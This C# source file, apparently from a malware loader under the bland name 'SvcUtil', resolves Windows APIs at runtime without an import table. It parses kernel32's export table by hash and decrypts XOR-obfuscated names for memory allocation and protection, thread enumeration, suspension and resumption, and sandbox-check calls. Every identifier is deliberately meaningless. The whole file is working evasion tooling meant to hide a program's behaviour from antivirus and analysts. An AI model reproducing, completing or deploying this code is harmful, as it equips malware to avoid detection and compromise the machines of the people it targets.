using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    internal static class W
    {
        // ── Bootstrap ───────────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
        private delegate IntPtr Fa(string n);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
        private delegate IntPtr Fb(IntPtr h, string n);

        private static Fa _fa;
        private static Fb _fb;

        private const uint H_GPA = 0xAADFAB0B;
        private const uint H_LLA = 0x01ED9ADD;

        private static IntPtr BM()
        {
            var modules = Process.GetCurrentProcess().Modules;
            string target = D(_k32);
            for (int i = 0; i < modules.Count; i++)
            {
                if (string.Equals(modules[i].ModuleName, target,
                        StringComparison.OrdinalIgnoreCase))
                    return modules[i].BaseAddress;
            }
            return IntPtr.Zero;
        }

        private static uint Hv(IntPtr p)
        {
            uint h = 5381;
            int off = 0;
            byte b;
            while ((b = Marshal.ReadByte(p, off++)) != 0)
                h = ((h << 5) + h) ^ b;
            return h;
        }

        private static IntPtr RX(IntPtr mb, uint th)
        {
            int e_lfanew = Marshal.ReadInt32(mb, 0x3C);
            IntPtr pe = (IntPtr)(mb.ToInt64() + e_lfanew);
            short magic = Marshal.ReadInt16(pe, 0x18);
            int exRva = Marshal.ReadInt32(pe, magic == 0x20B ? 0x88 : 0x78);
            if (exRva == 0) return IntPtr.Zero;
            IntPtr ed = (IntPtr)(mb.ToInt64() + exRva);
            int nn = Marshal.ReadInt32(ed, 0x18);
            int rf = Marshal.ReadInt32(ed, 0x1C);
            int rn = Marshal.ReadInt32(ed, 0x20);
            int ro = Marshal.ReadInt32(ed, 0x24);
            for (int i = 0; i < nn; i++)
            {
                int nrva = Marshal.ReadInt32(
                    (IntPtr)(mb.ToInt64() + rn), i * 4);
                IntPtr np = (IntPtr)(mb.ToInt64() + nrva);
                if (Hv(np) == th)
                {
                    short ord = Marshal.ReadInt16(
                        (IntPtr)(mb.ToInt64() + ro), i * 2);
                    int frva = Marshal.ReadInt32(
                        (IntPtr)(mb.ToInt64() + rf), ord * 4);
                    return (IntPtr)(mb.ToInt64() + frva);
                }
            }
            return IntPtr.Zero;
        }

        private static void EB()
        {
            if (_fa != null) return;
            IntPtr k = BM();
            if (k == IntPtr.Zero) throw new EntryPointNotFoundException();
            IntPtr pg = RX(k, H_GPA);
            IntPtr pl = RX(k, H_LLA);
            if (pg == IntPtr.Zero || pl == IntPtr.Zero)
                throw new EntryPointNotFoundException();
            _fb = (Fb)Marshal.GetDelegateForFunctionPointer(pg, typeof(Fb));
            _fa = (Fa)Marshal.GetDelegateForFunctionPointer(pl, typeof(Fa));
        }

        // ── String decode ───────────────────────────────────────────

        private static readonly byte[] _xk = { 0x71, 0x58, 0x2D, 0x93, 0xA4 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        private static readonly byte[] _k32 = { 0x1A, 0x3D, 0x5F, 0xFD, 0xC1, 0x1D, 0x6B, 0x1F, 0xBD, 0xC0, 0x1D, 0x34 };
        private static readonly byte[] _s02 = { 0x32, 0x34, 0x42, 0xE0, 0xC1, 0x39, 0x39, 0x43, 0xF7, 0xC8, 0x14 };
        private static readonly byte[] _s04 = { 0x36, 0x3D, 0x59, 0xD0, 0xD1, 0x03, 0x2A, 0x48, 0xFD, 0xD0, 0x21, 0x2A, 0x42, 0xF0, 0xC1, 0x02, 0x2B };
        private static readonly byte[] _s07 = { 0x26, 0x2A, 0x44, 0xE7, 0xC1, 0x37, 0x31, 0x41, 0xF6 };
        private static readonly byte[] _s08 = { 0x26, 0x39, 0x44, 0xE7, 0xE2, 0x1E, 0x2A, 0x7E, 0xFA, 0xCA, 0x16, 0x34, 0x48, 0xDC, 0xC6, 0x1B, 0x3D, 0x4E, 0xE7 };
        private static readonly byte[] _s09 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x7D, 0xE1, 0xCB, 0x05, 0x3D, 0x4E, 0xE7 };
        private static readonly byte[] _s10 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x6C, 0xFF, 0xC8, 0x1E, 0x3B };
        private static readonly byte[] _s11 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x6B, 0xE1, 0xC1, 0x14 };
        private static readonly byte[] _s12 = { 0x27, 0x31, 0x5F, 0xE7, 0xD1, 0x10, 0x34, 0x6C, 0xFF, 0xC8, 0x1E, 0x3B, 0x68, 0xEB, 0xEA, 0x04, 0x35, 0x4C };
        private static readonly byte[] _s13 = { 0x37, 0x34, 0x5E, 0xD2, 0xC8, 0x1D, 0x37, 0x4E };
        private static readonly byte[] _s14 = { 0x37, 0x34, 0x5E, 0xD5, 0xD6, 0x14, 0x3D };
        private static readonly byte[] _s15 = { 0x36, 0x3D, 0x59, 0xC7, 0xCD, 0x12, 0x33, 0x6E, 0xFC, 0xD1, 0x1F, 0x2C, 0x1B, 0xA7 };
        private static readonly byte[] _s16 = { 0x32, 0x2A, 0x48, 0xF2, 0xD0, 0x14, 0x0C, 0x42, 0xFC, 0xC8, 0x19, 0x3D, 0x41, 0xE3, 0x97, 0x43, 0x0B, 0x43, 0xF2, 0xD4, 0x02, 0x30, 0x42, 0xE7 };
        private static readonly byte[] _s17 = { 0x25, 0x30, 0x5F, 0xF6, 0xC5, 0x15, 0x6B, 0x1F, 0xD5, 0xCD, 0x03, 0x2B, 0x59 };
        private static readonly byte[] _s18 = { 0x25, 0x30, 0x5F, 0xF6, 0xC5, 0x15, 0x6B, 0x1F, 0xDD, 0xC1, 0x09, 0x2C };
        private static readonly byte[] _s19 = { 0x3E, 0x28, 0x48, 0xFD, 0xF0, 0x19, 0x2A, 0x48, 0xF2, 0xC0 };
        private static readonly byte[] _s20 = { 0x23, 0x3D, 0x5E, 0xE6, 0xC9, 0x14, 0x0C, 0x45, 0xE1, 0xC1, 0x10, 0x3C };

        // ── Module handle ───────────────────────────────────────────

        private static IntPtr _hK = IntPtr.Zero;

        private static IntPtr K
        {
            get
            {
                if (_hK == IntPtr.Zero)
                {
                    EB();
                    _hK = _fa(D(_k32));
                }
                return _hK;
            }
        }

        private static Delegate GF(byte[] enc, Type dt)
        {
            EB();
            IntPtr addr = _fb(K, D(enc));
            if (addr == IntPtr.Zero)
                throw new EntryPointNotFoundException();
            return Marshal.GetDelegateForFunctionPointer(addr, dt);
        }

        // ── Delegate signatures ─────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T02(IntPtr h);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr T04();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T07(
            IntPtr a, byte[] b, uint c,
            out int d, IntPtr e);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate int T08(IntPtr a, int b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T09(
            IntPtr a, UIntPtr b, uint c, out uint d);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr T10(
            IntPtr a, UIntPtr b, uint c, uint d);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T11(IntPtr a, UIntPtr b, uint c);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr T12(
            IntPtr a, IntPtr b, UIntPtr c,
            uint d, uint e, uint f);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate uint T13(IntPtr a);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T14(uint a);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate ulong T15();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr T16(uint a, uint b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T17(IntPtr a, IntPtr b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate bool T18(IntPtr a, IntPtr b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr T19(uint a, bool b, uint c);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate uint T20(IntPtr a);

        // ── Cached instances ────────────────────────────────────────

        private static T02 _f02;
        private static T04 _f04;
        private static T07 _f07;
        private static T08 _f08;
        private static T09 _f09;
        private static T10 _f10;
        private static T11 _f11;
        private static T12 _f12;
        private static T13 _f13;
        private static T14 _f14;
        private static T15 _f15;
        private static T16 _f16;
        private static T17 _f17;
        private static T18 _f18;
        private static T19 _f19;
        private static T20 _f20;

        // ── Public wrappers ─────────────────────────────────────────

        public static IntPtr M0(string n)
        {
            EB();
            return _fa(n);
        }

        public static IntPtr M1(IntPtr h, string n)
        {
            EB();
            return _fb(h, n);
        }

        public static T02 M4
        {
            get
            {
                if (_f02 == null)
                    _f02 = (T02)GF(_s02, typeof(T02));
                return _f02;
            }
        }

        public static T04 M6
        {
            get
            {
                if (_f04 == null)
                    _f04 = (T04)GF(_s04, typeof(T04));
                return _f04;
            }
        }

        public static T07 M9
        {
            get
            {
                if (_f07 == null)
                    _f07 = (T07)GF(_s07, typeof(T07));
                return _f07;
            }
        }

        public static T08 MA
        {
            get
            {
                if (_f08 == null)
                    _f08 = (T08)GF(_s08, typeof(T08));
                return _f08;
            }
        }

        public static T09 MB
        {
            get
            {
                if (_f09 == null)
                    _f09 = (T09)GF(_s09, typeof(T09));
                return _f09;
            }
        }

        public static IntPtr MC(IntPtr a, UIntPtr b, uint c, uint d)
        {
            if (_f10 == null)
                _f10 = (T10)GF(_s10, typeof(T10));
            return _f10(a, b, c, d);
        }

        public static bool MD(IntPtr a, UIntPtr b, uint c)
        {
            if (_f11 == null)
                _f11 = (T11)GF(_s11, typeof(T11));
            return _f11(a, b, c);
        }

        public static IntPtr ME(IntPtr a, IntPtr b, UIntPtr c,
            uint d, uint e, uint f)
        {
            if (_f12 == null)
                _f12 = (T12)GF(_s12, typeof(T12));
            return _f12(a, b, c, d, e, f);
        }

        public static uint MF(IntPtr a)
        {
            if (_f13 == null)
                _f13 = (T13)GF(_s13, typeof(T13));
            return _f13(a);
        }

        public static bool MG(uint a)
        {
            if (_f14 == null)
                _f14 = (T14)GF(_s14, typeof(T14));
            return _f14(a);
        }

        public static ulong MH()
        {
            if (_f15 == null)
                _f15 = (T15)GF(_s15, typeof(T15));
            return _f15();
        }

        public static IntPtr MI(uint a, uint b)
        {
            if (_f16 == null)
                _f16 = (T16)GF(_s16, typeof(T16));
            return _f16(a, b);
        }

        public static bool MJ(IntPtr a, IntPtr b)
        {
            if (_f17 == null)
                _f17 = (T17)GF(_s17, typeof(T17));
            return _f17(a, b);
        }

        public static bool MK(IntPtr a, IntPtr b)
        {
            if (_f18 == null)
                _f18 = (T18)GF(_s18, typeof(T18));
            return _f18(a, b);
        }

        public static IntPtr ML(uint a, bool b, uint c)
        {
            if (_f19 == null)
                _f19 = (T19)GF(_s19, typeof(T19));
            return _f19(a, b, c);
        }

        public static uint MM(IntPtr a)
        {
            if (_f20 == null)
                _f20 = (T20)GF(_s20, typeof(T20));
            return _f20(a);
        }
    }
}
